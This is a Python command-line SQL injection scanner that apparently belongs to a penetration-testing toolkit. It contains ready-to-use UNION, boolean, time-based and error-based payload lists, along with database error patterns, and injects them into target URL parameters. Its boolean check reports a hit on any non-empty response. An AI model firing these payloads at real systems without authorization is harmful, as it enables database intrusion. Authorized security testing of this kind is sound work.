#!/usr/bin/env python3
"""
SQL Injection Scanner - Automated SQLi Detection

Tests web applications for SQL injection vulnerabilities using multiple techniques.

[!] AUTHORIZATION REQUIRED: Only use on authorized targets.

Usage:
    python sql_injection.py --url <url> [options]

Examples:
    # Basic SQL injection scan
    python sql_injection.py --url "http://example.com/search?q=test"

    # Test specific parameter
    python sql_injection.py --url "http://example.com/login" --param username --method POST

    # Use all injection types
    python sql_injection.py --url "http://example.com/page.php?id=1" --all-types

Author: David Dashti
Date: 2025-10-15
MITRE ATT&CK: T1190 (Exploit Public-Facing Application)
"""

import argparse
import re
import sys
import time
import urllib.parse
from enum import Enum
from typing import Any

import requests

from utils.config import load_config
from utils.helpers import RateLimiter, check_authorization, sanitize_filename, validate_url
from utils.logger import get_logger

logger = get_logger(__name__)


class InjectionType(Enum):
    """SQL injection types."""

    UNION = "union"
    BOOLEAN = "boolean"
    TIME_BASED = "time-based"
    ERROR_BASED = "error-based"


# SQL injection payloads
PAYLOADS = {
    InjectionType.UNION: [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        '" UNION SELECT NULL--',
        "1 UNION SELECT NULL--",
        "-1' UNION SELECT NULL,table_name FROM information_schema.tables--",
    ],
    InjectionType.BOOLEAN: [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR 1=1--",
        '" OR "1"="1',
        '" OR 1=1--',
        "' OR 'a'='a",
        "') OR ('1'='1",
        '") OR ("1"="1',
        "' OR 'x'='x'--",
        "admin' --",
        "admin' #",
        "' or 1=1 limit 1 --",
    ],
    InjectionType.TIME_BASED: [
        "' AND SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "'; WAITFOR DELAY '00:00:05'--",
        "1' AND SLEEP(5)--",
        "1; WAITFOR DELAY '00:00:05'--",
        "'; SELECT SLEEP(5)--",
        "' OR SLEEP(5)--",
        "\"; WAITFOR DELAY '00:00:05'--",
    ],
    InjectionType.ERROR_BASED: [
        "'",
        '"',
        "\\",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND 1=CAST((SELECT @@version) AS int)--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "' AND updatexml(1,concat(0x7e,version()),1)--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--",
    ],
}

# SQL error patterns
SQL_ERRORS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_.*",
    r"valid MySQL result",
    r"MySqlClient\.",
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpg_.*",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r"Driver.* SQL[-_ ]*Server",
    r"OLE DB.* SQL Server",
    r"(\W|^)SQL Server.*Driver",
    r"Warning.*mssql_.*",
    r"Microsoft SQL Native Client error",
    r"ODBC SQL Server Driver",
    r"SQLServer JDBC Driver",
    r"Oracle error",
    r"Oracle.*Driver",
    r"Warning.*\Woci_.*",
    r"Warning.*\Wora_.*",
    r"quoted string not properly terminated",
    r"SQL command not properly ended",
    r"DB2 SQL error",
    r"SQLITE_ERROR",
    r"sqlite3.OperationalError",
    r"SQLite/JDBCDriver",
    r"System.Data.SQLite.SQLiteException",
]


class SQLInjectionScanner:
    """
    SQL injection vulnerability scanner.

    Tests for various SQL injection types.
    """

    def __init__(self, config: dict[str, Any] | None = None) -> None:
        """
        Initialize SQL injection scanner.

        Args:
            config: Optional configuration dictionary
        """
        self.config = config or load_config()
        self.rate_limiter = RateLimiter(
            self.config.get("rate_limit", {}).get("requests_per_second", 5)
        )
        self.session = requests.Session()
        self.session.headers.update(
            {
                "User-Agent": self.config.get("http", {}).get(
                    "user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                )
            }
        )
        self.vulnerabilities: list[dict[str, Any]] = []
        logger.info(f"Initialized {self.__class__.__name__}")

    def test_injection(
        self,
        url: str,
        param: str,
        payload: str,
        injection_type: InjectionType,
        method: str = "GET",
        data: dict[str, str] | None = None,
    ) -> dict[str, Any] | None:
        """
        Test a single SQL injection payload.

        Args:
            url: Target URL
            param: Parameter to inject
            payload: SQL injection payload
            injection_type: Type of injection
            method: HTTP method
            data: POST data

        Returns:
            Vulnerability details if found, None otherwise
        """
        self.rate_limiter.wait()

        try:
            timeout = self.config.get("timeouts", {}).get("connection", 10)

            # Prepare request
            if method.upper() == "GET":
                # Inject into URL parameter
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                params[param] = [payload]
                new_query = urllib.parse.urlencode(params, doseq=True)
                test_url = urllib.parse.urlunparse(
                    (
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        new_query,
                        parsed.fragment,
                    )
                )

                start_time = time.time()
                response = self.session.get(test_url, timeout=timeout)
                elapsed_time = time.time() - start_time

            else:  # POST
                # Inject into POST data
                test_data = data.copy() if data else {}
                test_data[param] = payload

                start_time = time.time()
                response = self.session.post(url, data=test_data, timeout=timeout)
                elapsed_time = time.time() - start_time

            # Check for vulnerability
            vuln = self._check_vulnerability(response, elapsed_time, injection_type, payload, param)

            if vuln:
                logger.warning(f"Potential SQLi found: {injection_type.value} in {param}")
                return vuln

        except requests.exceptions.Timeout:
            # Timeout might indicate time-based SQLi
            if injection_type == InjectionType.TIME_BASED:
                logger.warning(f"Timeout detected (potential time-based SQLi): {param}")
                return {
                    "type": injection_type.value,
                    "parameter": param,
                    "payload": payload,
                    "evidence": "Request timeout (possible time-based injection)",
                    "confidence": "medium",
                }
        except Exception as e:
            logger.debug(f"Error testing {param} with {payload}: {e}")

        return None

    def _check_vulnerability(
        self,
        response: requests.Response,
        elapsed_time: float,
        injection_type: InjectionType,
        payload: str,
        param: str,
    ) -> dict[str, Any] | None:
        """
        Check if response indicates vulnerability.

        Args:
            response: HTTP response
            elapsed_time: Response time
            injection_type: Type of injection tested
            payload: Payload used
            param: Parameter tested

        Returns:
            Vulnerability details if found
        """
        # Error-based detection
        if injection_type == InjectionType.ERROR_BASED:
            for error_pattern in SQL_ERRORS:
                if re.search(error_pattern, response.text, re.IGNORECASE):
                    return {
                        "type": injection_type.value,
                        "parameter": param,
                        "payload": payload,
                        "evidence": f"SQL error pattern detected: {error_pattern}",
                        "confidence": "high",
                    }

        # Time-based detection
        elif injection_type == InjectionType.TIME_BASED:
            if elapsed_time >= 5:  # Should match SLEEP/WAITFOR duration
                return {
                    "type": injection_type.value,
                    "parameter": param,
                    "payload": payload,
                    "evidence": f"Response time: {elapsed_time:.2f}s (expected delay)",
                    "confidence": "high",
                }

        # Boolean-based detection (requires baseline comparison)
        elif injection_type == InjectionType.BOOLEAN:
            # Simple heuristic: check for significant content length change
            # In production, this would require baseline comparison
            if len(response.text) > 0:
                return {
                    "type": injection_type.value,
                    "parameter": param,
                    "payload": payload,
                    "evidence": "Response indicates possible boolean-based SQLi (requires manual verification)",
                    "confidence": "low",
                }

        # Union-based detection
        elif injection_type == InjectionType.UNION:
            # Check for NULL values or information_schema references in response
            if re.search(r"NULL|information_schema", response.text, re.IGNORECASE):
                return {
                    "type": injection_type.value,
                    "parameter": param,
                    "payload": payload,
                    "evidence": "Response contains UNION-related data",
                    "confidence": "medium",
                }

        return None

    def scan_url(
        self,
        url: str,
        params: list[str] | None = None,
        injection_types: list[InjectionType] | None = None,
        method: str = "GET",
        data: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """
        Scan URL for SQL injection vulnerabilities.

        Args:
            url: Target URL
            params: Parameters to test (if None, extract from URL)
            injection_types: Types of injection to test
            method: HTTP method
            data: POST data

        Returns:
            List of vulnerabilities found
        """
        if injection_types is None:
            injection_types = [InjectionType.ERROR_BASED, InjectionType.BOOLEAN]

        vulnerabilities = []

        # Extract parameters if not provided
        if params is None:
            if method.upper() == "GET":
                parsed = urllib.parse.urlparse(url)
                params = list(urllib.parse.parse_qs(parsed.query).keys())
            elif data:
                params = list(data.keys())
            else:
                logger.error("No parameters to test")
                return vulnerabilities

        if not params:
            logger.warning("No parameters found in URL")
            return vulnerabilities

        logger.info(f"Testing {len(params)} parameters with {len(injection_types)} injection types")

        # Test each parameter with each injection type
        for param in params:
            print(f"[*] Testing parameter: {param}")

            for inj_type in injection_types:
                payloads = PAYLOADS[inj_type]
                print(f"    [*] Testing {inj_type.value} injection ({len(payloads)} payloads)...")

                for payload in payloads:
                    vuln = self.test_injection(url, param, payload, inj_type, method, data)
                    if vuln:
                        vulnerabilities.append(vuln)
                        print("        [+] Potential vulnerability found!")
                        # Only report first finding per parameter/type combination
                        break

        return vulnerabilities

    def run(
        self,
        url: str,
        params: list[str] | None = None,
        test_all_types: bool = False,
        method: str = "GET",
        data: dict[str, str] | None = None,
    ) -> dict[str, Any]:
        """
        Execute SQL injection scan.

        Args:
            url: Target URL
            params: Parameters to test
            test_all_types: Test all injection types
            method: HTTP method
            data: POST data

        Returns:
            Scan results
        """
        # Authorization check
        if not check_authorization(url, self.config):
            logger.error(f"URL {url} not authorized")
            return {"error": "Not authorized"}

        # Validate URL
        if not validate_url(url):
            logger.error(f"Invalid URL: {url}")
            return {"error": "Invalid URL"}

        logger.info(f"Starting SQL injection scan for {url}")
        print(f"\n[*] SQL Injection Scan: {url}")

        # Determine injection types to test
        if test_all_types:
            injection_types = list(InjectionType)
        else:
            injection_types = [InjectionType.ERROR_BASED, InjectionType.BOOLEAN]

        # Perform scan
        vulnerabilities = self.scan_url(url, params, injection_types, method, data)

        results = {
            "url": url,
            "method": method,
            "parameters_tested": params or "auto-detected",
            "injection_types": [t.value for t in injection_types],
            "vulnerabilities_found": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
        }

        logger.info(f"Scan complete: {len(vulnerabilities)} vulnerabilities found")
        self._save_results(results)

        return results

    def _save_results(self, results: dict[str, Any]) -> None:
        """
        Save scan results to output directory.

        Args:
            results: Results dictionary to save
        """
        import json
        from datetime import datetime
        from pathlib import Path

        output_dir = Path(self.config.get("output", {}).get("directory", "output"))
        output_dir.mkdir(exist_ok=True)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        url_safe = sanitize_filename(results["url"])
        filename = f"sqli_{url_safe}_{timestamp}.json"
        output_path = output_dir / filename

        try:
            with open(output_path, "w") as f:
                json.dump(results, f, indent=2)
            logger.info(f"Results saved to {output_path}")
        except Exception as e:
            logger.error(f"Error saving results: {e}")


def main() -> int:
    """
    Main entry point for command-line usage.

    Returns:
        int: Exit code (0 for success, non-zero for failure)
    """
    parser = argparse.ArgumentParser(
        description="SQL Injection Scanner - Automated SQLi Detection\n"
        "[!] For authorized security testing only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    parser.add_argument("--url", required=True, help="Target URL to scan")

    parser.add_argument("--param", help="Specific parameter to test")

    parser.add_argument(
        "--method", default="GET", choices=["GET", "POST"], help="HTTP method (default: GET)"
    )

    parser.add_argument("--data", help="POST data in format key1=value1&key2=value2")

    parser.add_argument(
        "--all-types", action="store_true", help="Test all injection types (including time-based)"
    )

    parser.add_argument("--config", help="Path to configuration file")

    parser.add_argument("--verbose", "-v", action="store_true", help="Enable verbose output")

    args = parser.parse_args()

    # Load configuration
    config = load_config(args.config) if args.config else load_config()

    # Set log level
    if args.verbose:
        from utils.logger import set_log_level

        set_log_level(logger, "DEBUG")

    print("\n" + "=" * 70)
    print("[!] SQL Injection Scanner - For Authorized Security Testing Only")
    print("=" * 70)

    # Create scanner
    scanner = SQLInjectionScanner(config)

    # Parse POST data if provided
    post_data = None
    if args.data:
        post_data = dict(urllib.parse.parse_qsl(args.data))

    # Determine parameters to test
    params = [args.param] if args.param else None

    # Run scan
    results = scanner.run(args.url, params, args.all_types, args.method, post_data)

    if "error" in results:
        print(f"\n[-] Error: {results['error']}")
        return 1

    # Print summary
    print("\n[+] Scan Summary:")
    print(f"    URL: {results['url']}")
    print(f"    Method: {results['method']}")
    print(f"    Injection Types: {', '.join(results['injection_types'])}")
    print(f"    Vulnerabilities Found: {results['vulnerabilities_found']}")

    if results["vulnerabilities"]:
        print("\n[+] Vulnerabilities:")
        for vuln in results["vulnerabilities"]:
            print(f"\n    Type: {vuln['type']}")
            print(f"    Parameter: {vuln['parameter']}")
            print(f"    Payload: {vuln['payload']}")
            print(f"    Evidence: {vuln['evidence']}")
            print(f"    Confidence: {vuln['confidence']}")
    else:
        print("\n[+] No SQL injection vulnerabilities detected")

    return 0


if __name__ == "__main__":
    sys.exit(main())
